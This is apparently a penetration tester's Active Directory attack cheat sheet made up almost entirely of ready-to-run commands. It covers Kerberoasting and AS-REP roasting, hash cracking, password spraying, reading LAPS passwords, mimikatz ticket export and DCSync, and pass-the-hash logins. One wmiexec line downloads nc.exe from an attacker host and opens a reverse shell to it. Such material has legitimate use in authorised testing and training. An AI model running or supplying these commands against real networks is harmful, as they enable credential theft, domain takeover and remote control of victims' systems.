#request the TGS Ticket using AD Module, use the SPN name found using above commands
powershell.exe -exec bypass -c "Add-Type -AssemblyName System.IdentityModel; New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'SPNNAME/hostname.steins.LOCAL:1433' "

Get TGS Ticket Using PowerView
Request-SPNTicket

Get TGS Ticket Using Invoke-Kerberoast
Import-Module .\Invoke-Kerberoast.ps1
#Generate the hash
Invoke-Kerberoast -OutputFormat Hashcat 
Get TGS Ticket Using Rubeus
.\Rubeus.exe kerberoast /domain:steins.local /user:username/format:hashcat /outfile:hash.txt

#Export the ticket from memory to disk using mimikatz
Invoke-Mimikatz -Command '"Kerberos::list /export"'
#Cracking the hash
hashcat -m 13100 -a 0 ticket.hashcat /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/T0XlC-insert_space_and_special_0_F.rule  --force

or 

hashcat -a 0 -m 13100 ticket.hashcat /usr/share/wordlists/rockyou.txt -r/usr/share/hashcat/rules/d3ad0ne.rule --force

or 

hashcat -a 0 -m 13100 hash ~/Downloads/Tools/rockyou.txt -r /usr/share/hashcat/rules/InsidePro-PasswordsPro.rule --force 
or

hashcat -m 13100 krb5t_hash rockyou.txt --force  

or 

python tgscrack.py wordlist.txt hash.txt 

Targeted Kerberosting - AS-REPs Roasting
Find users with -PreAuthNotRequiered set or users to which we have acecss to Genric All/Generic Write ACL set. 

Log generated is 4769 for Adding DoNotPre-Auth on target user


Step- 1 - Finding Users with PreAuth not required (Skip to Step-5 if you find any users)

#Powerview - Finding users with PreauthNotRequired set 
Get-DomainUser -PreauthNotRequired -Verbose

#AD Module - Finding users with PreauthNotRequired set
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuths

#LDAPQuery - Finding users with PreAuth Not req
(&(UserAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2))(!(objectCategory=computer)))


Step - 2 - Finding users to Abuse 

#Finding Users with enough persmissions to modify acls
powerview_dev.ps1 Invoke-ACLScanner -ResolveGUIds | {$_.IdentityReferenceName -match "RDPUsers"}

#Finding Objects with GenericWrite
Get-ObjectAcl -SamAccountName * -ResolveGUIDs | ? {($_.ActiveDirectoryRights -match 'GenericWrite')}

#Finding users with GenericAll
Get-ObjectAcl -SamAccountName * -ResolveGUIDs | ? {($_.ActiveDirectoryRights -match 'GenericAll')}

#or check if anything matches with your SID (for ease of access)
Get-ObjectAcl -SamAccountName * -ResolveGUIDs | ? {($_.ActiveDirectoryRights -match 'GenericWrite') -and ($_.SecurityIdentifier -match 'S-1-5-21-1087654965-336889418-4984984984-1501')}

Step - 3 Disabling Pre-Auth

#PowerView : Disabling PreAuth for Kerberos
Powerview.exe Set-DomainObject -Identity USER_NAME -XOR @{useraccountcontrol=4194304} -Verbose

#Using AD Module Disabling PreAuth for Kerberos
Set-ADAccountControl -Identity Administrator -doesnotrequirepreauth $true

Step - 4 - Validating the changes 

#Find the users with PreAuth Not Required
Get-DomainUser -PreAuthNotRequired -Verbose

Step - 5 - Getting the AS-REP

#Using ASREPRoast.ps1 Requesting AS-REP for offline bruteforcing:
Get-ASREPhash -Username USER_NAME -Verbose
Invoke-ASREPRoast -Verbose		

OR

#Using Rubeus for Requesting AS-REP for offline bruteforcing: remove all the spaces from the hash before bruteforcing 
Rubeus.exe asreproast /user:UserName 
OR
Rubeus.exe asreproast /user:Administrator /format:hashcat /outfile:hash.txt

OR

#get the hash using GetNPUsers.py
GetNPUsers.py STEINS-DC.LOCAL/ -usersfile users.txt -outputfile hashes.txt -dc-ip 10.10.10.10

Step - 6 - Cracking the hash 

#Copy the hash and crack it using John
john krbhash --wordlist=wordlist.txt 

#Cracking using Hashcat; add $23 after $krb5asrep if you do not export the hash as hashcat format
hashcat -m 18200 hash -a 3 rockyou.txt
hashcat -m 18200 hash rockyou.txt -r /usr/share/hashcat/rules/d3ad0ne.rule --force 

Targeted Kerberoasting - Set SPN 
Step -1 

#PowerView - Find users with GenericAll Permissions Set
Invoke-ACLScanner -ResolveGUIds | {$_.IdentityReferenceName -match "RDPUsers"}

#AD Module - Find the user without SPN 
Get-ADUser -Identity USER_Name -Properties ServicePrincipalName | Select ServicePrincipalName

Step -2 

#AD Module - Set SPN for a User (Must be Unique for the domain)
Set-ADUser -Identity USER_NAME -ServicePrincipalNames @{Add='DomainName/SomeUniqueName'} -Server steins.local

#PowerView - Set SPN for a User
Set-DomainObject -Identity USER_NAME -Set @{serviceprincialName = 'DomainName/SomeUniqueName'}

or

Set-ADObject -SamAccountName <TARGET_Username> -PropertyName serviceprincipalname -PropertyVale 'domainName/SomeUniqueName'


#Setting SPN Using addspn.py
python addspn.py steinsdc.local -u <USER_WITH_WRITE_PRIVS> --spn “DomainName/SomeUniqueName” --target TARGET_USERNAME


Step -3 

#Validate SPN Set to the username
Get-ADUser -Identity USER_Name -Properties ServicePrincipalName | Select ServicePrincipalName

Step -4 

#Requesting TGS Ticket using AD Module 
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosReceiverSecurityToken -ArgumentList 'DomainName/SomeUniqueName'

#Get TGS Ticket Using PowerView
Request-SPNTicket
Get-Domainuser Target_Username | Get-DomainSPNTicket

#Get TGS Ticket Using Invoke-Kerberoast
Import-Module .\Invoke-Kerberoast.ps1
#Generate the hash
Invoke-Kerberoast -OutputFormat Hashcat 

#Get TGS Ticket Using Rubeus
.\Rubeus.exe kerberoast /domain:steins.local /user:username/format:hashcat /outfile:hash.txt

#Get TGS Ticket and the hash using GetUserSPNs.py
GetUserSPNs.py domain/username -request

#Request a TGS using Invoke-Kerberoast.ps1
Invoke-Kerberoast -Identity Traget_username


Step -5 

#check the TGS Ticket for DomainName/SomeUniqueName
klist	

#Export the tickets
Invoke-Mimikatz -Command '"kerberos::list /export"'


Cleanup:

Set-ADUser -Identity USER_NAME -ServicePrincipalNames @{Remove='DomainName/SomeUniqueName'} -Server steins.local

python addspn.py steinsdc.local -u <USER_WITH_WRITE_PRIVS> --spn “DomainName/SomeUniqueName” --target TARGET_USERNAME --remove

Set-DomainObject -Identity USER_NAME -Clear serviceprincipalname

Set-ADObject -SamAccountName <TARGET> -PropertyName serviceprincipalname -ClearValue


Step -6 

#Crack the TGS Ticket
hashcat -m 13100 -a 0 ticket.hashcat /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/T0XlC-insert_space_and_special_0_F.rule  --force

or 

hashcat -a 0 -m 13100 ticket.hashcat /usr/share/wordlists/rockyou.txt -r/usr/share/hashcat/rules/d3ad0ne.rule --force

or 

hashcat -a 0 -m 13100 hash ~/Downloads/Tools/rockyou.txt -r /usr/share/hashcat/rules/InsidePro-PasswordsPro.rule --force 
or

hashcat -m 13100 krb5t_hash rockyou.txt --force  

or 

python tgscrack.py wordlist.txt hash.txt 



------------------------------- 
#Single Command using Powerview after you find the user 
Set-DomainObject -Identity USER_NAME -Set @{serviceprincialName = 'DomainName/SomeUniqueName'}
$User = Get-DomainUser USER_NAME 
$User | Get-DomainSPNTicket | fl
$User | Select serviceprincipalname
Set-DomainObject -Identity USER_NAME -Clear serviceprincipalname

Brute Forcing Domain Users

kerbrute userenum --dc 10.10.10.10 -d steins.local users.txt 

Download Kerbrute from here
kerbrute userenum --domain htb.local /usr/share/SecLists/Usernames/xato-net-10-million-usernames.txt --dc 10.10.10.10

#brute forcing using Rubeus
Rubeus.exe /users:users.txt /passwords:wordlist.txt /domain:steins.local /outfile:Output.txt  

#Brute Forcing & Password Spraying using CME
crackmapexec <protocol> <target(s)> -u ~/file_containing_usernames -p ~/file_containing_passwords
crackmapexec <protocol> <target(s)> -u username1 username2 -p password1


#Password Spraying without bruteforce CME
crackmapexec <protocol> <target(s)> -u ~/file_containing_usernames -H ~/file_containing_ntlm_hashes --no-bruteforce

crackmapexec <protocol> <target(s)> -u ~/file_containing_usernames -p ~/file_containing_passwords --no-bruteforce


ASREP Roast via Linux: Get users hash from a DoNotPre-Auth user

sudo GetNPUsers.py STEINS-DC.LOCAL/ -usersfile users.txt -outputfile hashes.txt -dc-ip 10.10.10.10

sudo john hash --format=krb5asrep --wordlist=rockyou.txt 
# better copy rockyou.txt to the same location  

ASREP Roast as an Authenticated user 

python3 GetNPUsers.py steins.local/user:"password!" -dc-ip 10.10.10.10 -request 

Updating Time to Match DC - KRB_AP_ERR_SKEW(Clock skew too great)

#Display the time of the server 
proxychains net time -S 10.10.10.10

or 

#Get DC time from curl response headers 
proxychains curl DC_IP:5985 -v 

sudo date -s "Thu Dec 24 10.10.10.10"


or 

sudo apt-get install ntpdate
sudo ntpdate <MACHINE IP>
sudo apt-get install chrony
sudo timedatectl set-ntp true
sudo ntpdate <machine IP>

Password Spraying 
Import-Module PowerView.ps1

#list all domain users and save them to a text file 
PowerShell Get-DomainUser | select samaccountname

Import-Module DomainPasswordSpray.ps1

Invoke-DomainPasswordSpray -UserList users.txt -Password 'P@$$W0rd!' -OutFile sprayed-creds.txt

or 

proxychains crackmapexec  smb 10.10.10.10 -d steins.local -u users.txt -p 'p@$$w0rd1' --continue-on-success

LAPS Delgation

#Find Users/groups that have red access to LAPS Password for a specific computer
Get-NetComputer -ComputerName 'computer_name ' FullData |
	Select-Object -ExpandProperty distinguishedname |
	ForEach-Object { $_.substring($_.indexof('OU')) } | ForEach Object {
	Get-ObjectAcl -ResolveGUIDs DistinguishedName $_} | Where-Object {
	($_.ObjectType -like 'ms-Mcs-AdmPwd') -and ($_.ActiveDirectoryRights -match 'ReadProperty')} | 
	ForEach-Object { Convert-NameToSid $_.IdentityReference} | Select-Object -ExpandProperty SID | Get-ADObject


#Find ACLs for all OUs where someone is allowed to read the LAPS password

Get-NetOU -FullData | Get-ObjectAcl -ResolveGUIDs |Where-Object {($_.ObjectType -like 'ms-Mcs-AdmPwd') -and
	($_.ActiveDirectoryRights -match 'ReadProperty') } | ForEach-Object {$_ | Add-Member NoteProperty 'IdentitySID' $(Convert-NameToSid $_.IdentityReference).SID;
	$_ }

#Find the list of users who has access to the groups 
$LAPSAdmins = Get-ADGroup ‘<GROUP1>’ | Get-ADGroupMember -Recursive
$LAPSAdmins += Get-ADGroup ‘<GROUP1>’ | Get-ADGroupMember -Recursive
$LAPSAdmins | Select Name,distinguishedName | sort name -unique | format-table -auto

LAPS Recon

#Find if LAPS client is installed on the local machine
Get-ChildItem 'c:\program files\LAPS\CSE\Admpwd.dll'
Get-FileHash  'c:\program files\LAPS\CSE\Admpwd.dll'
Test-Path 'HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\NT\CurrentVersion\Winlogon\GPExtensions'

#Check the existence of LAPS attributes:
Get-AdObject ‘CN=ms mcs-admpwd,CN=Schema,CN=Configuration,DC=ELS,DC=LOCAL’”

#Check for GPOs containing LAPS in its display name
Get-DomainGPO -Identity ‘*LAPS*’”

#Finding all computers where the LAPS GPO has been applied and get the computers list 
Get-DomainOU -GPLink “<GUID_NAME>” -Properties distinguishedname
Get-DomainComputer -SearchBase “LDAP://<distinguishedname>” -Properties distinguishedname


#List the users who has access to LAPS Password - using LAPS Powershell Module
Find-AdmPwdExtendedRights Identity workstations | %{$_.ExtendedRightHolders}

# Retrieve LAPS Password using LAPS Powershell Module
Get-AdmPwdPassword -ComputerName <Target> | fl

#Changing LAPS Expiry Time 
Set-DomainObject -Identity <TARGET_COMPUTER> -Set @{‘ms-Mcs-AdmPwdExpirationTime’=‘<NEW_VALUE>’} -Verbose

Open a Shell using creds: 

#if Port 5985 is open, we can login into winrm

sudo evil-winrm -u USERNAME -p PASSWORD -i 10.10.10.10

or 

evil-winrm -u username -H 9658d1d1dcd9250115e2205d9f48400d -i 10.10.10.10


or 

 psexec.py USERNAME@10.10.10.10

or 

sudo secretsdump.py USERNAME@10.10.10.10

OR  login to the machine and 

./mimikatz.exe "lsadump::dcsync /user:Administrator" "exit";

or 
evil-winrm -i 10.10.10.10 -u administrator -p aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6

or 
wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6 steins.local/administrator@10.10.10.10


or 


.\SharpDPAPI.exe machinecredentials

psexec.py Administrator@10.10.10.10 -hashes LMHASH:NTHASH

Impersonating Credentials 

# if running in -sta mode, impersonate another credential a la "runas /netonly"
$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Invoke-UserImpersonation -Credential $Cred

# ... action
Invoke-RevertToSelf

Enumerating AD Recycle Bin Group

Get-ADObject -filter 'isDeleted -eq $true -and name -ne "Deleted Objects"' -includeDeletedObjects

#Now check for users passwords. might come in handy sometimes
Get-ADObject -filter { SAMAccountName -eq "UserName" } -includeDeletedObjects -property *

RCE using wmiexec

proxychains wmiexec.py -debug -nooutput domain/username:'password'@TARGET_ip "powershell.exe Invoke-WebRequest -Uri 'http://KALI_ip/nc.exe' -OutFile 'C:\Windows\System32\spool\drivers\color\nc.exe'; cmd.exe /c C:\Windows\System32\spool\drivers\color\nc.exe -e cmd.exe KALI_IP 9001"

Kerberos Ticketing on Linux

#Create a TGT using KNIT 
kinit username@steins.localn

# Login using kerberos 
KRB5CCNAME=/tmp/krb5cc_0 python wmiexec.py -k -no-pass steins.local/username@target

#When you havea hash but NTLM is disbaled 
ktutil -k kerbticket_path add -p username@steins.local -e arcfour-hmac-md5 -w 49623ccc820122ab49b3f0f571b77186 --hex -V 5

#Create a TGT 
kinit -t kerbticket_path username@steins.local

#Login using Wmiexec by kerberos auth
KRB5CCNAME=/tmp/krb5cc_0 python wmiexec.py -k -no-pass steins.local/username@target

Converting kirbit to ccache

ticket_converter.py Administrator.kirbi Administrator.ccache
